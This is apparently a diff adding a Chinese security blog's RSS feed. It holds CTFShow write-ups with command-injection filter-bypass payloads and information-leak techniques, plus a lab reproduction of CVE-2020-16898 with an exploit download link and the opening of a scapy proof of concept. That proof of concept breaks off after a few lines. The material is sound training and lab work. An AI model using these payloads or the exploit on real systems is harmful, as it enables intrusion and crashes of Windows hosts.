+    &lt;span class=&#34;nx&#34;&gt;highlight_file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;__FILE__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;strong&gt;&amp;gt;/dev/null 2&amp;gt;&amp;amp;1&lt;/strong&gt;主要意思是不进行回显的意思 。&lt;/p&gt;
+&lt;p&gt;我们要让命令回显，那么进行命令分隔即可&lt;/p&gt;
+&lt;p&gt;;	//分号
+|	//只执行后面那条命令
+||	//只执行前面那条命令
+&amp;amp;	//两条命令都会执行
+&amp;amp;&amp;amp;	//两条命令都会执行&lt;/p&gt;
+&lt;p&gt;payload：cat flag.php;&lt;/p&gt;
+&lt;p&gt;webpayload:   cat flag.php||&lt;/p&gt;
+&lt;h2 id=&#34;web43&#34;&gt;web43&lt;/h2&gt;
+&lt;p&gt;多过滤了cat和分号。换一个就好。&lt;/p&gt;
+&lt;p&gt;payload:  tac%20flag.php%0a&lt;/p&gt;
+&lt;h2 id=&#34;web44&#34;&gt;web44&lt;/h2&gt;
+&lt;p&gt;多过滤一个flag，通配符解决。&lt;/p&gt;
+&lt;p&gt;payload:  tac%20fla*%0a&lt;/p&gt;
+&lt;h2 id=&#34;web45&#34;&gt;web45&lt;/h2&gt;
+&lt;p&gt;多过滤了一个空格，众所周知php环境下可以用&lt;code&gt;%09&lt;/code&gt;代替空格。&lt;/p&gt;
+&lt;p&gt;payload:  tac%09fla*%0a&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&amp;gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt; &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;&amp;lt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt; &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;&amp;lt;&amp;gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt; 重定向符
+&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;%09&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;需要php环境&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;IFS&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;
+&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$IFS$9&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;
+&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;cat,flag.php&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt; //用逗号实现了空格功能
+&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;%20&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;
+&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;%09
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;空格绕过&lt;/p&gt;
+&lt;h2 id=&#34;web46&#34;&gt;web46&lt;/h2&gt;
+&lt;p&gt;过滤了数子，$，*等，通配符可以使用？问号，空格可用%09&lt;/p&gt;
+&lt;p&gt;payload: ?c=sort%09fl?g.php||&lt;/p&gt;
+&lt;h2 id=&#34;web47&#34;&gt;web47&lt;/h2&gt;
+&lt;p&gt;又过滤了些别的。&lt;/p&gt;
+&lt;p&gt;payload: ?c=tac%09fl?g.php||&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>CTFShow web入门信息收集wp</title>
+        <link>https://lunaasuka.github.io/p/ctfshow-web%E5%85%A5%E9%97%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86wp/</link>
+        <pubDate>Thu, 08 Apr 2021 00:00:00 +0000</pubDate>
+        
+        <guid>https://lunaasuka.github.io/p/ctfshow-web%E5%85%A5%E9%97%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86wp/</guid>
+        <description>&lt;h3 id=&#34;简简单单&#34;&gt;简简单单&lt;/h3&gt;
+&lt;h2 id=&#34;web1源码泄露&#34;&gt;web1源码泄露&lt;/h2&gt;
+&lt;p&gt;直接f12就能看到。&lt;/p&gt;
+&lt;h2 id=&#34;web2绕过前台js&#34;&gt;web2绕过前台JS&lt;/h2&gt;
+&lt;p&gt;由于js限制该网页不能直接查看源码，可以考虑禁用js，或者直接Ctrl+U，或者 view-source:http://网站/&lt;/p&gt;
+&lt;h2 id=&#34;web3协议头信息泄露&#34;&gt;web3协议头信息泄露&lt;/h2&gt;
+&lt;p&gt;响应头里存了flag，直接burp抓包查看，或者f12用network查看。&lt;/p&gt;
+&lt;h2 id=&#34;web4后台robots泄露&#34;&gt;web4后台robots泄露&lt;/h2&gt;
+&lt;p&gt;访问robots.txt，可以找到有一个/flagishere.txt目录，直接访问得到flag。&lt;/p&gt;
+&lt;h2 id=&#34;web5-phps源码泄露&#34;&gt;web5 PHPS源码泄露&lt;/h2&gt;
+&lt;p&gt;直接访问 index.phps，得到源码，就能看到flag。&lt;/p&gt;
+&lt;h2 id=&#34;web6源码压缩包泄露&#34;&gt;web6源码压缩包泄露&lt;/h2&gt;
+&lt;p&gt;有提示，所以可以直接访问，网站后面加www.zip。没有提示的情况下可以直接用扫描器扫出来。&lt;/p&gt;
+&lt;p&gt;解压得到文件，提示flag在fl000g.txt里，直接网页访问即可。&lt;/p&gt;
+&lt;h2 id=&#34;web7版本控制泄露源码&#34;&gt;web7版本控制泄露源码&lt;/h2&gt;
+&lt;p&gt;实际上就是git泄露，可以通过扫描得到。之后可以直接访问或者使用githack这样的工具。&lt;/p&gt;
+&lt;h2 id=&#34;web8版本控制泄露2&#34;&gt;web8版本控制泄露2&lt;/h2&gt;
+&lt;p&gt;实际上是svn泄露，同理git。也有相关工具可供使用，github自寻。&lt;/p&gt;
+&lt;h2 id=&#34;web9-vim临时文件泄露&#34;&gt;web9 vim临时文件泄露&lt;/h2&gt;
+&lt;p&gt;程序员使用vim编辑器编写一个index.php文件时，会有一个.index.php.swp文件，如果文件正常退出，则该文件被删除，如果异常退出，该文件则会保存下来，该文件可以用来恢复异常退出的index.php，同时多次意外退出并不会覆盖旧的.swp文件，而是会生成一个新的，例如.swo文件。&lt;/p&gt;
+&lt;p&gt;做法同上，直接访问即可。&lt;/p&gt;
+&lt;h2 id=&#34;web10-cookie泄露&#34;&gt;web10 cookie泄露&lt;/h2&gt;
+&lt;p&gt;直接查看cookie即可。&lt;/p&gt;
+&lt;h2 id=&#34;web11域名记录泄露&#34;&gt;web11域名记录泄露&lt;/h2&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://www.jsons.cn/nslookup/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;http://www.jsons.cn/nslookup/&lt;/a&gt;在这个网站里直接查询ctfshow.com即可。&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/dai451954706/article/details/37696651&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;关于域名解析类型&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;web12敏感信息泄露&#34;&gt;web12敏感信息泄露&lt;/h2&gt;
+&lt;p&gt;首先扫目录，可以发现有登录口，访问需要账号密码，账号很明显是admin，密码未知，在整个网站内进行搜寻，可以发现页面最下方有一行数字，即为密码，登录拿到flag。&lt;img src=&#34;https://lunaasuka.github.io/p/ctfshow-web%E5%85%A5%E9%97%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86wp/1617869991492.png&#34;
+	width=&#34;722&#34;
+	height=&#34;395&#34;
+	srcset=&#34;https://lunaasuka.github.io/p/ctfshow-web%E5%85%A5%E9%97%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86wp/1617869991492_huad86a6262786a65d2679fb79ce81d26b_48902_480x0_resize_box_2.png 480w, https://lunaasuka.github.io/p/ctfshow-web%E5%85%A5%E9%97%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86wp/1617869991492_huad86a6262786a65d2679fb79ce81d26b_48902_1024x0_resize_box_2.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;1617869991492&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;182&#34;
+		data-flex-basis=&#34;438px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;web13内部技术文档泄露&#34;&gt;web13内部技术文档泄露&lt;/h2&gt;
+&lt;p&gt;网页最下方有个document可以点进去，该文件翻到最后可以找到后台地址和账号密码，登录即可。&lt;/p&gt;
+&lt;h2 id=&#34;web14编辑器配置不当&#34;&gt;web14编辑器配置不当&lt;/h2&gt;
+&lt;p&gt;根据提示，访问editor界面，这里面有上传功能，可以在这里访问目标服务器的内部文件，找到flag即可。&lt;/p&gt;
+&lt;h2 id=&#34;web15密码逻辑脆弱&#34;&gt;web15密码逻辑脆弱&lt;/h2&gt;
+&lt;p&gt;扫目录，登录后台，用户名admin，忘记密码，密保答案是西安，至于为啥是西安，你可以找到一个qq群号，这个群显示所在地点是西安。。。然后登录即可。&lt;/p&gt;
+&lt;h2 id=&#34;web16探针泄露&#34;&gt;web16探针泄露&lt;/h2&gt;
+&lt;p&gt;说了是探针泄露，那就直接访问tz.php，搜索flag即可。&lt;/p&gt;
+&lt;p&gt;php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。 url后缀名添加/tz.php 版本是雅黑PHP探针。&lt;/p&gt;
+&lt;h2 id=&#34;web17cdn穿透&#34;&gt;web17CDN穿透&lt;/h2&gt;
+&lt;p&gt;通过使用各类解析网站或者ping之类的工具得到目标网站的ip即可。&lt;/p&gt;
+&lt;h2 id=&#34;web18-js敏感信息泄露&#34;&gt;web18 js敏感信息泄露&lt;/h2&gt;
+&lt;p&gt;根据题目，找js文件，里面有条判断，是当分数达到100以上时触发的&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;score&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;result&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;window&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;confirm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这串Unicode转换成中文就能得到线索。&lt;/p&gt;
+&lt;h2 id=&#34;web19前段密钥泄露&#34;&gt;web19前段密钥泄露&lt;/h2&gt;
+&lt;p&gt;查看源码，找到了处理后的密码，抓包改密码即可。&lt;/p&gt;
+&lt;h2 id=&#34;web20数据库恶意下载&#34;&gt;web20数据库恶意下载&lt;/h2&gt;
+&lt;p&gt;mdb文件是早期asp+access构架的数据库文件，直接查看url路径添加/db/db.mdb，下载文件通过txt打开或者通过EasyAccess.exe打开搜索flag 。&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>CVE-2020-16898漏洞复现</title>
+        <link>https://lunaasuka.github.io/p/cve-2020-16898%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
+        <pubDate>Wed, 03 Mar 2021 00:00:00 +0000</pubDate>
+        
+        <guid>https://lunaasuka.github.io/p/cve-2020-16898%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
+        <description>&lt;h3 id=&#34;内含exp&#34;&gt;内含EXP&lt;/h3&gt;
+&lt;h2 id=&#34;漏洞概述&#34;&gt;漏洞概述&lt;/h2&gt;
+&lt;p&gt;​		远程攻击者通过构造特制的ICMPv6  Router  Advertisement（路由通告）数据包，并将其发送到远程Windows主机上，即可在目标主机上执行任意代码。要利用此漏洞，攻击者必须将特制的ICMPv6路由器广告数据包发送到远程Windows计算机。&lt;/p&gt;
+&lt;h2 id=&#34;影响范围&#34;&gt;影响范围&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Windows 10 Version 1709 for 32-bit Systems&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Windows 10 Version 1709 for ARM64-based Systems&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Windows 10 Version 1709 for x64-based Systems&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Windows 10 Version 1803 for 32-bit Systems&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Windows 10 Version 1803 for ARM64-based Systems&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Windows 10 Version 1803 for x64-based Systems&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Windows 10 Version 1809 for 32-bit Systems&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Windows 10 Version 1809 for ARM64-based Systems&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Windows 10 Version 1809 for x64-based Systems&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Windows 10 Version 1903 for 32-bit Systems&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Windows 10 Version 1903 for ARM64-based Systems&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Windows 10 Version 1903 for x64-based Systems&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Windows 10 Version 1909 for 32-bit Systems&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Windows 10 Version 1909 for ARM64-based Systems&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Windows 10 Version 1909 for x64-based Systems&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Windows 10 Version 2004 for 32-bit Systems&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Windows 10 Version 2004 for ARM64-based Systems&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Windows 10 Version 2004 for x64-based Systems&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Windows Server 2019&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Windows Server 2019 (Server Core installation)&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Windows Server, version 1903 (Server Core installation)&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Windows Server, version 1909 (Server Core installation)&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Windows Server, version 2004 (Server Core installation)&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;环境搭建&#34;&gt;环境搭建&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;攻击机：kali2019&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;​		python版本3.7.4，已安装scapy包。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;靶机：win10 2004版本&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;首先我们要在虚拟机中nat一个子网出来，打开VMware，选择左上角编辑→虚拟网络编辑器，打开后点击下方的“更改设置”。&lt;img src=&#34;https://lunaasuka.github.io/p/cve-2020-16898%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1614758181562.png&#34;
+	width=&#34;1278&#34;
+	height=&#34;654&#34;
+	srcset=&#34;https://lunaasuka.github.io/p/cve-2020-16898%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1614758181562_hu81f59daf043eaf67d146aca1115a7884_68018_480x0_resize_box_2.png 480w, https://lunaasuka.github.io/p/cve-2020-16898%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1614758181562_hu81f59daf043eaf67d146aca1115a7884_68018_1024x0_resize_box_2.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;1614758181562&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;195&#34;
+		data-flex-basis=&#34;468px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;然后进入NAT设置中选择启用IPV6，应用设置即可。&lt;/p&gt;
+&lt;p&gt;这边开启之后去把win10的ipv6打开，进入网络和internet设置，查看虚拟网卡的属性。&lt;img src=&#34;https://lunaasuka.github.io/p/cve-2020-16898%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1614758404441.png&#34;
+	width=&#34;782&#34;
+	height=&#34;585&#34;
+	srcset=&#34;https://lunaasuka.github.io/p/cve-2020-16898%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1614758404441_hu19df3a1e78db4bea68fb410623c9e2ce_54245_480x0_resize_box_2.png 480w, https://lunaasuka.github.io/p/cve-2020-16898%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1614758404441_hu19df3a1e78db4bea68fb410623c9e2ce_54245_1024x0_resize_box_2.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;1614758404441&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;133&#34;
+		data-flex-basis=&#34;320px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;勾选IPV6即可。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lunaasuka.github.io/p/cve-2020-16898%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1614758518557.png&#34;
+	width=&#34;819&#34;
+	height=&#34;491&#34;
+	srcset=&#34;https://lunaasuka.github.io/p/cve-2020-16898%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1614758518557_hue99ccb8d48c27e06d0b510821ed143fe_12695_480x0_resize_box_2.png 480w, https://lunaasuka.github.io/p/cve-2020-16898%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1614758518557_hue99ccb8d48c27e06d0b510821ed143fe_12695_1024x0_resize_box_2.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;1614758518557&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;166&#34;
+		data-flex-basis=&#34;400px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;漏洞复现&#34;&gt;漏洞复现&lt;/h2&gt;
+&lt;p&gt;EXP下载地址： &lt;a class=&#34;link&#34; href=&#34;http://site.pi3.com.pl/exp/p_CVE-2020-16898.py&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;http://site.pi3.com.pl/exp/p_CVE-2020-16898.py&lt;/a&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;ch&#34;&gt;#!/usr/bin/env python3&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;#&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;# Proof-of-Concept / BSOD exploit for CVE-2020-16898 - Windows TCP/IP Remote Code Execution Vulnerability&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;#&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;# Author: Adam &amp;#39;pi3&amp;#39; Zabrocki&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;# http://pi3.com.pl&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;#&lt;/span&gt;
+
+&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;scapy.all&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
+
+&lt;span class=&#34;n&#34;&gt;v6_dst&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;fd12:db80:b052:0:7ca6:e06e:acc1:481b&amp;#34;&lt;/span&gt; 		&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;这里替换成靶机的&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ipv6地址或临时ipv6地址&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;v6_src&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;fe80::24f5:a2ff:fe30:8890&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;这里替换成攻击机的本地链接&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ipv6地址&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;win&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;或者最短的那个&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ipv6地址&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;linux&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+
+&lt;span class=&#34;n&#34;&gt;p_test_half&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x18\x30&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\xFF\x18&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
